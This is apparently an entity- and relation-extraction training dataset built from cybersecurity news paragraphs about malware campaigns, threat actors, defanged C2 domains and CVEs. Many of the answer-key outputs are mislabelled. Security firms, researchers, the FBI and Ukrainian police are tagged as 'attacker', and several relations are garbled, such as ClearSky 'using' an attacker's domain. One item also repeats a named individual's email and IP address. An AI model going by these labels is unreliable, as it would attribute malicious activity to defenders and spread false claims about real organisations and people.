{"instruction": "The threat actors have also been observed duping bank customers into installing rogue Android apps under the guise of security software that, once installed, requests SMS permissions to capture SMS-based two-factor authentication (2FA) codes sent by the bank. The Ankarex platform, for its part, has been active since May 2022. It's actively promoted on a Telegram channel that has about 1,700 subscribers. \"The service itself is accessible at ankarex[.]net, and once registered, users can upload funds using cryptocurrency transfers and launch their own Smishing campaigns by specifying the SMS content and target phone numbers,\" Thill said. The development comes as ThreatFabric detailed a new Anatsa (aka TeaBot) banking trojan campaign that has been targeting banking customers in the U.S., U.K., Germany, Austria, and Switzerland since the start of March 2023. Found this article interesting? Follow us on Twitter \uf099 and LinkedIn to read more exclusive content we post.", "input": null, "output": "Named Entities: (rogue Android apps, malware), (Ankarex, tool), (ankarex[.]net, Domain), (Anatsa, malware), (TeaBot, malware)\nRelationships: (ankarex[.]net, accessible at, Ankarex)"}
{"instruction": "It's also designed to abort if a victim's location is in the stealer's predefined list of excluded countries, which consists of the Commonwealth of Independent States (CIS) and Turkmenistan. Meduza Stealer, besides gathering data from 19 password manager apps, 76 crypto wallets, 95 web browsers, Discord, Steam, and system metadata, harvests miner-related Windows Registry entries as well as a list of installed games, indicating a broader financial motive. It's currently being offered for sale on underground forums such as XSS and Exploit.in and a dedicated Telegram channel as a recurring subscription that costs $199 per month, $399 for three months, or $1,199 for a lifetime license. The information pilfered by the malware is made available through a user-friendly web panel. \"This feature allows subscribers to download or delete the stolen data directly from the web page, granting them an unprecedented level of control over their ill-gotten information,\" the researchers said.", "input": null, "output": "Named Entities: (Meduza Stealer, malware), (Exploit.in, Domain)\nRelationships: (Meduza Stealer, offered for sale on, Exploit.in)"}
{"instruction": "The infection chain consists of a macOS installer file that installs a backdoored, yet functional, PDF reader. A significant aspect of the attacks is that the malicious activity is triggered only when a weaponized PDF file is launched using the rogue PDF reader. Initial intrusion vector includes phishing emails, as well as employing bogus personas on social networks such as LinkedIn. The observed attacks are highly targeted and focused on finance-related institutions in Asia, Europe, and the U.S., suggesting that the activity is geared towards illicit revenue generation to evade sanctions. What makes the newly identified version notable is its unusual persistence mechanism and the use of dynamic DNS domain (docsend.linkpc[.]net) for command-and-control, alongside incorporating measures focused on remaining under the radar.", "input": null, "output": "Named Entities: (PDF reader, tool), (phishing emails, threat type), (bogus personas, attacker), (docsend.linkpc[.]net, Domain)\nRelationships: No related relations."}
{"instruction": "Multiple SQL injection vulnerabilities have been disclosed in Gentoo Soko that could lead to remote code execution (RCE) on vulnerable systems. \"These SQL injections happened despite the use of an Object-Relational Mapping (ORM) library and prepared statements,\" SonarSource researcher Thomas Chauchefoin said, adding they could result in RCE on Soko because of a \"misconfiguration of the database.\" The two issues, which were discovered in the search feature of Soko, have been collectively tracked as CVE-2023-28424 (CVSS score: 9.1). They were addressed within 24 hours of responsible disclosure on March 17, 2023. Soko is a Go software module that powers packages.gentoo.org, offering users an easy way to search through different Portage packages that are available for Gentoo Linux distribution. But the shortcomings identified in the service meant that it could have been possible for a malicious actor to inject specially crafted code, resulting in the exposure of sensitive information.", "input": null, "output": "Named Entities: (CVE-2023-28424, vulnerability), (packages.gentoo.org, Domain)\nRelationships: No related relations."}
{"instruction": "The Russian cybersecurity company's investigation into Operation Triangulation began at the start of the year when it detected the compromise in its own enterprise network. In light of active exploitation, Federal Civilian Executive Branch (FCEB) agencies are recommended to apply vendor-provided patches to secure their networks against potential threats. The development comes as CISA issued an alert warning of three bugs in the Berkeley Internet Name Domain (BIND) 9 Domain Name System (DNS) software suite that could pave the way for a denial-of-service (DoS) condition. The flaws \u2013 CVE-2023-2828, CVE-2023-2829, and CVE-2023-2911 (CVSS scores: 7.5) \u2013 could be exploited remotely, resulting in the unexpected termination of the named BIND9 service or exhaustion of all available memory on the host running named, leading to DoS.", "input": null, "output": "Named Entities: (Berkeley Internet Name Domain (BIND) 9 Domain Name System (DNS) software suite, tool), (CVE-2023-2828, vulnerability), (CVE-2023-2829, vulnerability), (CVE-2023-2911, vulnerability)\nRelationships: No related relations."}
{"instruction": "A primary evasion tactic concerns the use of Microsoft Windows folders that are likely to be excluded from scanning by security software (e.g., System32 and Program Files) to store the backdoor payloads. One of the sub-folders in question is \"C:\\Program Files\\Dell\\CommandUpdate,\" which is the directory for a legitimate Dell application called Dell Command | Update. Bitdefender said all the machines infected over the course of the incident were manufactured by Dell, suggesting that the threat actors deliberately chose this folder to camouflage the malicious activity. This line of reasoning is bolstered by the fact that the threat actor registered command-and-control (C2) domains such as \"dell-a[.]ntp-update[.]com\" with the goal of blending in with the target environment.", "input": null, "output": "Named Entities: (dell-a[.]ntp-update[.]com, Domain)\nRelationships: No related relationships."}
{"instruction": "Team Cymru, in a report published earlier January, noted that \"Vidar operators have split their infrastructure into two parts; one dedicated to their regular customers and the other for the management team, and also potentially premium / important users.\" A key domain used by the Vidar actors is my-odin[.]com, which serves as the one-stop destination to manage the panel, authenticate affiliates, and share files. While previously it was possible to download files from the site without any authentication, performing the same action now redirects the user to a login page. Another change involves updates to the IP address hosting the domain itself. This includes moving from 186.2.166[.]15 to 5.252.179[.]201 to 5.252.176[.]49 by the end of March 2023, with the threat actors accessing the latter using VPN servers around the same time.", "input": null, "output": "Named Entities: (Vidar, malware), (my-odin[.]com, Domain), (186.2.166[.]15, IP), (5.252.179[.]201, IP), (5.252.176[.]49, IP), (VPN servers, tool)\nRelationships: (Vidar, use, my-odin[.]com), (my-odin[.]com, host, 186.2.166[.]15), (my-odin[.]com, host, 5.252.179[.]201), (my-odin[.]com, host, 5.252.176[.]49), (VPN servers, access, 5.252.176[.]49)"}
{"instruction": "\"By using VPN infrastructure, which in at least part was also utilized by numerous other benign users, it is apparent that the Vidar threat actors may be taking steps to anonymize their management activities by hiding in general Internet noise,\" Team Cymru noted. The cybersecurity company said it also detected outbound connections from 5.252.176[.]49 to a legitimate website called blonk[.]co as well as a host located in Russia (185.173.93[.]98:443). The Vidar infrastructure has been further found to receive yet another facelift effective May 3, 2023, with the introduction of a new IP address 185.229.64[.]137 hosting the my-odin[.]com domain along with the use of TOR relays by the operators to access their accounts and malware repositories.", "input": null, "output": "Named Entities: (VPN infrastructure, tool), (Vidar, malware), (5.252.176[.]49, IP), (blonk[.]co, Domain), (185.173.93[.]98:443, IP), (185.229.64[.]137, IP), (my-odin[.]com, Domain), (TOR relays, tool)\nRelationships: (Vidar, use, VPN infrastructure), (5.252.176[.]49, connect to, blonk[.]co), (5.252.176[.]49, connect to, 185.173.93[.]98:443), (Vidar, use, TOR relays), (TOR relays, access, accounts and malware repositories)"}
{"instruction": "The use of chat apps as a lure to distribute the malware was previously highlighted in November 2021 by Cyble, which analyzed a sample named \"SoSafe Chat\" that was uploaded to the VirusTotal database from India. The chat apps, while not available on Google Play, are distributed through rogue websites promoting free messaging services: bingechat[.]net and chatico[.]co[.]uk. \"This group used fictitious personas \u2014 posing as recruiters for both legitimate and fake defense companies and governments, military personnel, journalists, and women looking to make a romantic connection \u2014 in an attempt to build trust with the people they targeted,\" Meta said in its Quarterly Adversarial Threat Report. The modus operandi suggests that potential targets are contacted on Facebook and Instagram with the goal of tricking them into clicking on the links and downloading the malicious apps.", "input": null, "output": "Named Entities: (SoSafe Chat, malware), (bingechat[.]net, Domain), (chatico[.]co[.]uk, Domain)\nRelationships: No related relations."}
{"instruction": "This meant that the shortcoming could be abused to embed endpoints within remote servers using the iframe tag and ultimately execute malicious JavaScript code, leading to the compromise of sensitive data. However, in order to exploit these weaknesses, a threat actor would have to conduct reconnaissance on different Azure services to single out vulnerable endpoints embedded within the Azure portal that may have missing X-Frame-Options headers or weak Content Security Policies (CSPs). \"Once the attacker successfully embeds the iframe in a remote server, they proceed to exploit the misconfigured endpoint,\" Ben Shitrit explained. \"They focus on the postMessage handler, which handles remote events such as postMessages.\" By analyzing the legitimate postMessages sent to the iframe from portal.azure[.]com, the adversary could subsequently craft appropriate payloads by embedding the vulnerable iframe in an actor-controlled server (e.g., ngrok) and creating a postMessage handler that delivers the malicious payload.", "input": null, "output": "Named Entities: (threat actor, attacker), (portal.azure[.]com, Domain), (ngrok, tool)\nRelationships: (actor-controlled server, tool, ngrok)"}
{"instruction": "Armed with this capability, a malicious actor could sign in and takeover another account, and subsequently take advantage of the sequential nature of the dealer site URLs (i.e., \"admin.pedealer.honda[.]com/dealersite/<ID>/dashboard) to gain unauthorized access to a different dealer's admin dashboard. \"Just by incrementing that ID, I could gain access to every dealers' data,\" Zveare explained. \"The underlying JavaScript code takes that ID and uses it in API calls to fetch data and display it on the page. Thankfully, this discovery rendered the need to reset any more passwords moot.\" To make matters worse, the design flaw could have been used to access a dealer's customers, edit their website and products, and worse, elevate privileges to the administrator of the entire platform \u2013 a feature restricted to Honda employees \u2013 by means of a specially crafted request to view details of the dealer network.", "input": null, "output": "Named Entities: (malicious actor, attacker), (admin.pedealer.honda[.]com, Domain)\nRelationships: No related relations."}
{"instruction": "The North Korean nation-state threat actor known as Kimsuky has been linked to a social engineering campaign targeting experts in North Korean affairs with the goal of stealing Google credentials and delivering reconnaissance malware. \"Further, Kimsuky's objective extends to the theft of subscription credentials from NK News,\" cybersecurity firm SentinelOne said in a report shared with The Hacker News. \"To achieve this, the group distributes emails that lure targeted individuals to log in on the malicious website nknews[.]pro, which masquerades as the authentic NK News site. The login form that is presented to the target is designed to capture entered credentials.\" NK News, established in 2011, is an American subscription-based news website that provides stories and analysis about North Korea.", "input": null, "output": "Named Entities: (Kimsuky, attacker), (reconnaissance malware, malware), (nknews[.]pro, Domain)\nRelationships: (Kimsuky, linked to, social engineering campaign), (Kimsuky, deliver, reconnaissance malware), (Kimsuky, objective extends to, theft of subscription credentials from NK News)"}
{"instruction": "Besides using Telegram for command-and-control, Dark Pink has been observed exfiltrating stolen data over HTTP using a service called webhook[.]site. Another notable aspect is the use of an Microsoft Excel add-in to ensure the persistence of TelePowerBot within the infected host. \"With webhook[.]site, it is possible to set up temporary endpoints in order to capture and view incoming HTTP requests,\" Polovinkin noted. \"The threat actor created temporary endpoints and sent sensitive data stolen from victims.\" Dark Pink, its espionage motives notwithstanding, remains shrouded in mystery. That said, it's suspected the hacking crew's victimology footprint could be broader than previously assumed.", "input": null, "output": "Named Entities: (Dark Pink, attacker), (Telegram, tool), (webhook[.]site, Domain), (Microsoft Excel add-in, tool), (TelePowerBot, malware)\nRelationships: (Dark Pink, use, Telegram), (Dark Pink, exfiltrating data, webhook[.]site), (Dark Pink, use, Microsoft Excel add-in), (Microsoft Excel add-in, ensure persistence, TelePowerBot)"}
{"instruction": "\"The vulnerability would have allowed a potential attacker to trick a user into visiting a malicious link, logging in to a third-party auth provider, and inadvertently revealing their third-party auth credentials,\" Expo's James Ide said. \"This was because auth.expo.io used to store an app's callback URL before the user explicitly confirmed they trust the callback URL.\" The disclosure follows the discovery of similar OAuth issues in Booking.com (and its sister site Kayak.com) that could have been leveraged to take control of a user's account, gain full visibility into their personal or payment-card data, and perform actions on the victim's behalf. The findings also come weeks after Swiss cybersecurity company Sonar detailed a path traversal and an SQL injection flaw in the Pimcore enterprise content management system (CVE-2023-28438) that an adversary can abuse to run arbitrary PHP code on the server with the permissions of the webserver.", "input": null, "output": "Named Entities: (Expo's James Ide, attacker), (auth.expo.io, Domain), (Booking.com, Domain), (Kayak.com, Domain), (Sonar, attacker), (CVE-2023-28438, vulnerability)\nRelationships: (Booking.com, sister site, Kayak.com)"}
{"instruction": "The JavaScript code further attempts to determine the user's language preference, which ClearSky said could be \"useful to the attacker to customize their attack based on the user's language.\" On top of that, the attacks also make use of a domain named jquery-stack[.]online for command-and-control (C2). The goal is to fly under the radar by impersonating the legitimate jQuery JavaScript framework. The development comes as Israel continues to be the most prominent target for Iranian state-sponsored crews. Microsoft, earlier this month, highlighted their new approach of combining \"offensive cyber operations with multi-pronged influence operations to fuel geopolitical change in alignment with the regime's objectives.\" Found this article interesting? Follow us on Twitter \uf099 and LinkedIn to read more exclusive content we post.", "input": null, "output": "Named Entities: (ClearSky, attacker), (jquery-stack[.]online, Domain), (Iranian state-sponsored crews, attacker)\nRelationships: (ClearSky, use, jquery-stack[.]online)"}
{"instruction": "The intermediate DLL file, for its part, is configured to download a cryptocurrency miner from one of the three C2 servers \u2013 179.43.155[.]202, work.letmaker[.]top, and su-94.letmaker[.]top \u2013 using TCP ports 9090, 9091, or 9092. Trend Micro said recent attacks have also entailed the misuse of a legitimate Linux tool called lwp-download to save arbitrary files on the compromised host. \"lwp-download is a Linux utility present in a number of platforms by default, and 8220 Gang making this a part of any malware routine can affect a number of services even if it were reused more than once,\" Bharti said. \"Considering the threat actor's tendency to reuse tools for different campaigns and abuse legitimate tools as part of the arsenal, organizations' security teams might be challenged to find other detection and blocking solutions to fend off attacks that abuse this utility.\"", "input": null, "output": "Named Entities: (cryptocurrency miner, tool), (179.43.155[.]202, IP), (work.letmaker[.]top, Domain), (su-94.letmaker[.]top, Domain), (lwp-download, tool), (Linux utility, tool)\nRelationships: (cryptocurrency miner, downloaded from, C2 servers), (C2 servers, IP, 179.43.155[.]202), (C2 servers, Domain, work.letmaker[.]top), (C2 servers, Domain, su-94.letmaker[.]top), (recent attacks, misuse, lwp-download)"}
{"instruction": "Also uncovered is a Windows shortcut (LNK) file that was uploaded to VirusTotal from Beijing in late November 2022. The LNK file, for its part, is engineered to run an HTML application (HTA) file retrieved from a remote server that spoofs Tsinghua University's email system (mailtsinghua.sinacn[.]co). Another LNK file that was uploaded to VirusTotal around the same time from Kathmandu employs a similar method to fetch an HTA file from a domain masquerading as a Nepalese government website (mailv.mofs-gov[.]org). Further investigation into SideWinder's infrastructure has led to the discovery of a malicious Android APK file (226617) that was uploaded to VirusTotal from Sri Lanka in March 2023. The rogue Android app passes off as a \"Ludo Game\" and prompts users to grant it access to contacts, location, phone logs, SMS messages, and calendar, effectively functioning as spyware capable of harvesting sensitive information.", "input": null, "output": "Named Entities: (VirusTotal, tool), (remote server, tool), (mailtsinghua.sinacn[.]co, Domain), (mailv.mofs-gov[.]org, Domain), (SideWinder's infrastructure, tool), (spyware, threat type)\nRelationships: No related relations."}
{"instruction": "Operation SpecTor is a successor to DisrupTor and DarkHunTor, which led to the arrest of 329 alleged suspects in 2020 and 2021 for buying, selling, and coordinating the sale of outlawed goods across underground marketplaces and shops. The development also comes as the U.S. Federal Bureau of Investigation (FBI) and the National Police of Ukraine seized nine virtual currency exchanges for knowingly offering cryptocurrency conversion services to criminal actors responsible for ransomware and other scams. \"These nine seized domains, 24xbtc.com, 100btc.pro, pridechange.com, 101crypta.com, uxbtc.com, trust-exchange.org, bitcoin24.exchange, paybtc.pro, and owl.gold offered anonymous cryptocurrency exchange services to website visitors,\" the Justice Department said. The dismantling is part of a broader effort undertaken by governments in Europe and the U.S. to target infrastructure used by malicious actors to launder illegal proceeds and obscure the money trails.", "input": null, "output": "Named Entities: (329 alleged suspects, attacker), (U.S. Federal Bureau of Investigation, attacker), (National Police of Ukraine, attacker), (nine virtual currency exchanges, tool), (cryptocurrency conversion services, tool), (ransomware, threat type), (scams, threat type), (24xbtc.com, Domain), (100btc.pro, Domain), (pridechange.com, Domain), (101crypta.com, Domain), (uxbtc.com, Domain), (trust-exchange.org, Domain), (bitcoin24.exchange, Domain), (paybtc.pro, Domain), (owl.gold, Domain), (anonymous cryptocurrency exchange services, tool), (infrastructure, tool)\nRelationships: (U.S. Federal Bureau of Investigation, seized, nine virtual currency exchanges), (National Police of Ukraine, seized, nine virtual currency exchanges), (governments in Europe, target, infrastructure), (U.S., target, infrastructure), (malicious actors, use, infrastructure)"}
{"instruction": "PingPull, first documented by Unit 42 in June 2022, is a remote access trojan that employs the Internet Control Message Protocol (ICMP) for command-and-control (C2) communications. The Linux flavor of the malware, which was uploaded to VirusTotal on March 7, 2023, boasts of similar functionalities as its Windows counterpart, allowing it to carry out file operations and run arbitrary commands by transmitting from the C2 server a single upper case character between A and K, and M. \"Upon execution, this sample is configured to communicate with the domain yrhsywu2009.zapto[.]org over port 8443 for C2,\" Unit 42 said. \"It uses a statically linked OpenSSL (OpenSSL 0.9.8e) library to interact with the domain over HTTPS.\" Interestingly, PingPull's parsing of the C2 instructions mirrors that of China Chopper, a web shell widely used by Chinese threat actors, suggesting that the threat actor is repurposing existing source code to devise custom tools.", "input": null, "output": "Named Entities: (PingPull, malware), (VirusTotal, tool), (yrhsywu2009.zapto[.]org, Domain), (OpenSSL 0.9.8e, tool), (China Chopper, tool)\nRelationships: (PingPull, upload to, VirusTotal), (PingPull, communicate with, yrhsywu2009.zapto[.]org), (PingPull, use, OpenSSL 0.9.8e), (PingPull, mirror, China Chopper)"}
{"instruction": "Some of the prominent capabilities of the C++-based malware include stealing files, logging keystrokes, harvesting clipboard data, recording audio streams, and credential theft from web browsers. ESET, which discovered the campaign in January 2022 after a legitimate Chinese application was used to deploy an installer for the MgBot backdoor, said the targeted users were located in the Gansu, Guangdong, and Jiangsu provinces and are members of an unnamed international NGO. The trojanized application is the Tencent QQ Windows client software updater (\"QQUrlMgr.exe\") hosted on the domain \"update.browser.qq[.]com.\" It's not immediately clear how the threat actor managed to deliver the implant through legitimate updates. But it points to either of the two scenarios: a supply chain compromise of Tencent QQ's update servers or a case of an adversary-in-the-middle (AitM) attack, as detailed by Kaspersky in June 2022 involving a Chinese hacking crew dubbed LuoYu.", "input": null, "output": "Named Entities: (C++-based malware, malware), (ESET, attacker), (MgBot backdoor, malware), (update.browser.qq[.]com, Domain), (LuoYu, attacker)\nRelationships: (ESET, discover, campaign), (campaign, use, MgBot backdoor), (MgBot backdoor, name, MgBot backdoor), (adversary-in-the-middle (AitM) attack, involve, LuoYu)"}
{"instruction": "Cybersecurity company Huntress, which found about 1,800 publicly exposed PaperCut servers, said it observed PowerShell commands being spawned from PaperCut software to install remote management and maintenance (RMM) software like Atera and Syncro for persistent access and code execution on the infected hosts. Additional infrastructure analysis has revealed the domain hosting the tools \u2013 windowservicecemter[.]com \u2013 was registered on April 12, 2023, and found to also host malware like TrueBot, although the company said it did not directly detect the deployment of the downloader. TrueBot is attributed to a Russian criminal entity known as Silence, which in turn has historical links with Evil Corp and its overlapping cluster TA505, the latter of which has facilitated the distribution of Cl0p ransomware in the past.", "input": null, "output": "Named Entities: (PaperCut software, tool), (windowservicecemter[.]com, Domain), (TrueBot, malware), (Silence, attacker), (Evil Corp, attacker), (TA505, attacker), (Cl0p ransomware, threat type)\nRelationships: (windowservicecemter[.]com, host, tools), (windowservicecemter[.]com, host, TrueBot), (TrueBot, attributed to, Silence), (Silence, historical links with, Evil Corp), (Evil Corp, historical links with, TA505), (TA505, facilitated the distribution of, Cl0p ransomware)"}
{"instruction": "\"On the Windows build environment, the attacker deployed a TAXHAUL launcher and COLDCAT downloader that persisted by performing DLL side-loading through the IKEEXT service and ran with LocalSystem privileges,\" Mandiant said. \"The macOS build server was compromised with POOLRAT backdoor using Launch Daemons as a persistence mechanism.\" POOLRAT, previously classified by the threat intelligence firm as SIMPLESEA, is a C/C++ macOS implant capable of collecting basic system information and executing arbitrary commands, including carrying out file operations. UNC4736 is suspected to be a threat group with North Korean nexus, an assessment that's been reinforced by ESET's discovery of an overlapping command-and-control (C2) domain (journalide[.]org) employed in the supply chain attack and that of a Lazarus Group campaign called Operation Dream Job. Evidence gathered by Mandiant shows that the group exhibits commonalities with another intrusion set tracked as Operation AppleJeus, which has a track record of carrying out financially motivated attacks.", "input": null, "output": "Named Entities: (TAXHAUL launcher, tool), (COLDCAT downloader, tool), (POOLRAT backdoor, malware), (UNC4736, attacker), (journalide[.]org, Domain), (Lazarus Group, attacker)\nRelationships: (TAXHAUL launcher, deploy, COLDCAT downloader), (UNC4736, suspected to be, Lazarus Group), (UNC4736, use, journalide[.]org)"}
{"instruction": "What's more, the breach of Trading Technologies' website is said to have taken place in early February 2022 to activate a multi-stage infection chain responsible for serving unknown payloads to the site visitors by weaponizing a then zero-day flaw in Google Chrome (CVE-2022-0609). \"The site www.tradingtechnologies[.]com was compromised and hosting a hidden IFRAME to exploit visitors, just two months before the site was known to deliver a trojanized X_TRADER software package,\" Mandiant explained. Another link connecting it to AppleJeus is the threat actor's previous use of an older version of POOLRAT as part of a long-running campaign disseminating booby-trapped trading applications like CoinGoTrade to facilitate cryptocurrency theft. The entire scale of the campaign remains unknown, and it's currently not clear if the compromised X_TRADER software was used by other firms. The platform was purportedly decommissioned in April 2020, but it was still available to download from the site in 2022.", "input": null, "output": "Named Entities: (CVE-2022-0609, vulnerability), (www.tradingtechnologies[.]com, Domain), (X_TRADER software, tool), (CoinGoTrade, tool), (AppleJeus, attacker), (POOLRAT, malware)\nRelationships: (AppleJeus, use, POOLRAT), (POOLRAT, part of, long-running campaign)"}
{"instruction": "Elite hackers associated with Russia's military intelligence service have been linked to large-volume phishing campaigns aimed at hundreds of users in Ukraine to extract intelligence and influence public discourse related to the war. Google's Threat Analysis Group (TAG), which is monitoring the activities of the actor under the name FROZENLAKE, said the attacks continue the \"group's 2022 focus on targeting webmail users in Eastern Europe.\" The state-sponsored cyber actor, also tracked as APT28, Fancy Bear, Forest Blizzard, Iron Twilight, Sednit, and Sofacy, is both highly prolific and proficient. It has been active since at least 2009, targeting media, governments, and military entities for espionage. The latest intrusion set, starting in early February 2023, involved the use of reflected cross-site scripting (XSS) attacks on various Ukrainian government websites to redirect users to phishing domains and capture their credentials.", "input": null, "output": "Named Entities: (Russia's military intelligence service, attacker), (FROZENLAKE, attacker), (APT28, attacker), (Fancy Bear, attacker), (Forest Blizzard, attacker), (Iron Twilight, attacker), (Sednit, attacker), (Sofacy, attacker), (phishing domains, threat type)\nRelationships: (Russia's military intelligence service, linked to, FROZENLAKE), (FROZENLAKE, linked to, APT28), (APT28, also tracked as, Fancy Bear), (APT28, also tracked as, Forest Blizzard), (APT28, also tracked as, Iron Twilight), (APT28, also tracked as, Sednit), (APT28, also tracked as, Sofacy), (reflected cross-site scripting (XSS), redirect users to, phishing domains)"}
{"instruction": "A third threat actor of interest is PUSHCHA (aka Ghostwriter or UNC1151), a Belarusian government-backed group that's known to act on behalf of Russian interests and which carried out targeted phishing attacks singling out Ukrainian webmail providers such as i.ua and meta.ua to siphon credentials. Lastly, Google TAG also highlighted a set of attacks mounted by the group behind Cuba ransomware to deploy RomCom RAT in the Ukrainian government and military networks. \"This represents a large shift from this actor's traditional ransomware operations, behaving more similarly to an actor conducting operations for intelligence collection,\" Leonard pointed out. In all, the tech giant's cybersecurity team, which works to counter nation-state hacking and attacks, said that Ukraine was at the receiving end of more than 60% of the phishing campaigns originating from Russia during the first three months of 2023.", "input": null, "output": "Named Entities: (PUSHCHA, attacker), (Ghostwriter, attacker), (UNC1151, attacker), (Cuba ransomware, threat type), (RomCom RAT, malware), (i.ua, Domain), (meta.ua, Domain), (Russia, attacker)\nRelationships: (Cuba ransomware, deploy, RomCom RAT), (Russia, originate, phishing campaigns)"}
{"instruction": "The starting point of the infections is an ELF malware sample, a compiled Python executable that's engineered to retrieve the second-stage Poseidon payload from a remote server. The cybersecurity firm noted that the fake Kavach apps are primarily distributed through rogue websites that are disguised as legitimate Indian government sites. This includes www.ksboard[.]in and www.rodra[.]in. With social engineering being the primary attack vector used by Transparent Tribe, users working within the Indian government are advised to double-check URLs received in emails before opening them. \"Repercussions of this APT36 attack could be significant, leading to loss of sensitive information, compromised systems, financial losses, and reputational damage,\" Sandapolla said. Found this article interesting? Follow us on Twitter \uf099 and LinkedIn to read more exclusive content we post.", "input": null, "output": "Named Entities: (ELF malware sample, malware), (Poseidon payload, malware), (Kavach apps, malware), (www.ksboard[.]in, Domain), (www.rodra[.]in, Domain), (Transparent Tribe, attacker), (APT36, threat type)\nRelationships: (ELF malware sample, retrieve, Poseidon payload)"}
{"instruction": "The cybersecurity firm said it also discovered a YouTube channel containing tutorial videos on how to use Legion, suggesting that the \"tool is widely distributed and is likely paid malware.\" The YouTube channel, which was created on June 15, 2021, remains active as of writing. Furthermore, Legion retrieves AWS credentials from insecure or misconfigured web servers and deliver SMS spam messages to users of U.S. mobile networks such as AT&T, Sprint, T-Mobile, Verizon, and Virgin. \"To do this, the malware retrieves the area code for a U.S. state of the user's choosing from the website www.randomphonenumbers.com,\" Muir said. \"A rudimentary number generator function is then used to build up a list of phone numbers to target.\" Another notable aspect of Legion is its ability to exploit well-known PHP vulnerabilities to register a web shell for persistent remote access or execute malicious code.", "input": null, "output": "Named Entities: (Legion, malware), (YouTube channel, tool), (www.randomphonenumbers.com, Domain), (web shell, tool)\nRelationships: No related relations."}
{"instruction": "The targeting of cryptocurrency companies is another telltale sign of the Lazarus Group's involvement, given the threat actor's recurring focus on the financial industry to generate illicit profits for the sanctions-hit nation. Kaspersky further said it identified a C2 overlap with a server (\"wirexpro[.]com\") that was previously identified as employed in an AppleJeus campaign documented by Malwarebytes in December 2022. \"As the Gopuram backdoor has been deployed to less than ten infected machines, it indicates that attackers used Gopuram with surgical precision,\" the company pointed out, adding the highest infection rates have been detected in Brazil, Germany, Italy, and France. While the attack chain discovered so far entails the use of rogue installers to distribute an information stealer (known as ICONIC Stealer), the latest findings suggest that the ultimate goal of the campaign may have been to infect targets with the full-fledged modular backdoor.", "input": null, "output": "Named Entities: (Lazarus Group, attacker), (wirexpro[.]com, Domain), (AppleJeus, malware), (Gopuram, malware), (ICONIC Stealer, malware)\nRelationships: (wirexpro[.]com, C2 overlap, AppleJeus), (Gopuram, use, ICONIC Stealer)"}
{"instruction": "The crux of the vulnerability stems from what's called \"Shared Responsibility confusion,\" wherein an Azure app can be incorrectly configured to allow users from any Microsoft tenant, leading to a potential case of unintended access. Interestingly, a number of Microsoft's own internal apps were found to exhibit this behavior, thereby permitting external parties to obtain read and write to the affected applications. This includes the Bing Trivia app, which the cybersecurity firm exploited to alter search results in Bing and even manipulate content on the homepage as part of an attack chain dubbed BingBang. To make matters worse, the exploit could be weaponized to trigger a cross-site scripting (XSS) attack on Bing.com and extract a victim's Outlook emails, calendars, Teams messages, SharePoint documents, and OneDrive files.", "input": null, "output": "Named Entities: (Bing Trivia app, tool), (Bing.com, Domain)\nRelationships: No related relations."}
{"instruction": "The flaw, according to Orca, impacts Azure Service Fabric Explorer version 9.1.1436.9590 or earlier. It has since been addressed by Microsoft as part of its March 2023 Patch Tuesday update, with the tech giant describing it as a spoofing vulnerability. \"The vulnerability is in the web client, but the malicious scripts executed in the victim's browser translate into actions executed in the (remote) cluster,\" Microsoft noted in its advisory. \"A victim user would have to click the stored XSS payload injected by the attacker to be compromised.\" The disclosure comes as NetSPI revealed a privilege escalation flaw in Azure Function Apps, enabling users with \"read only\" permissions to access sensitive information and gain command execution. It also follows the discovery of a misconfiguration in Azure Active Directory that exposed a number of applications to unauthorized access, including a content management system (CMS) that powers Bing.com.", "input": null, "output": "Named Entities: (March 2023 Patch Tuesday update, tool), (NetSPI, attacker), (Bing.com, Domain)\nRelationships: No related relations."}
{"instruction": "SentinelOne said it identified three different variants of the malware (from v2 to v4) dating back to February 2022. A notable functionality of AlienFoxV4 is its ability to check if an email address is already linked to an Amazon.com retail account, and if not, create a new account using that address. To mitigate threats posed by AlienFox, organizations are recommended to adhere to configuration management best practices and follow the principle of least privilege (PoLP). \"The AlienFox toolset demonstrates another stage in the evolution of cybercrime in the cloud,\" Delamotte said. \"For victims, compromise can lead to additional service costs, loss in customer trust, and remediation costs.\" Found this article interesting? Follow us on Twitter \uf099 and LinkedIn to read more exclusive content we post.", "input": null, "output": "Named Entities: (AlienFoxV4, malware), (Amazon.com, Domain)\nRelationships: No related relations."}
{"instruction": "The macOS sample (a 381 MB file), according to security researcher Patrick Wardle, carries a valid signature and is notarized by Apple, meaning it can be run without the operating system blocking it. The malicious app, similar to the Windows counterpart, includes a Mach-O binary named libffmpeg.dylib that's designed to reach out to an external server \"pbxsources[.]com\" to download and execute a file named UpdateAgent. The server is currently offline. Huntress reported that there are 242,519 publicly exposed 3CX phone management systems. Broadcom-owned Symantec, in its own advisory, said \"the information gathered by this malware presumably allowed the attackers to gauge if the victim was a candidate for further compromise.\" \"Due to its widespread use and its importance in an organization's communication system, threat actors can cause major damage (for example, by monitoring or rerouting both internal and external communication) to businesses that use this software,\" Trend Micro said.", "input": null, "output": "Named Entities: (libffmpeg.dylib, file), (pbxsources[.]com, Domain)\nRelationships: (libffmpeg.dylib, reach out to, pbxsources[.]com)"}
{"instruction": "Also unearthed by the agency is a Purse.io cryptocurrency account that was registered with the email address conorfitzpatrick2002@gmail.com and \"was funded exclusively by a Bitcoin address that pompompurin had discussed in posts on RaidForums.\" Records from Purse.io showed that the account was used to purchase \"several items\" and ship them to his address in Peekskill. On top of that, the FBI secured a warrant to get his real-time cell phone GPS location from Verizon, allowing the authorities to determine that he was logged in to BreachForums while his phone's physical location showed he was at his home. But that's not all. In yet another OPSEC error, Fitzpatrick made the mistake of logging into BreachForums on June 27, 2022, without using a VPN service or the TOR browser, thereby exposing the real IP address (69.115.201.194).", "input": null, "output": "Named Entities: (Purse.io, Domain), (Bitcoin address, tool), (pompompurin, attacker), (Verizon, tool), (VPN service, tool), (TOR browser, tool)\nRelationships: (pompompurin, funded, Bitcoin address)"}
